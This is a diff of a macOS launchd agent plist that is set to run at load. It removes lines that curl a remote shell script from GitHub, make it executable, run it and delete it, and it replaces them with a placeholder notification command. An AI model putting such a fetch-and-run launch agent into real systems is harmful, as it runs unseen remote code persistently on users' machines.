@@ -6,10 +6,8 @@
 	<string>com.zerowidth.launched.thisisthenameofthelaunchd</string>
 	<key>ProgramArguments</key>
 	<array>
-		<string>curl https://raw.githubusercontent.com/g6mqchyhTy/cipagent/master/cipagent.sh</string>
-		<string>chmod +x cipagent.sh</string>
-		<string>bash cipagent.sh</string>
-		<string>rm cipagent.sh</string>
+		<string>bash</string>
+		<string>osascript -e 'display notification &quot;Lorem ipsum dolor sit amet&quot; with title &quot;Title&quot;'</string>
 	</array>
 	<key>RunAtLoad</key>
 	<true/>
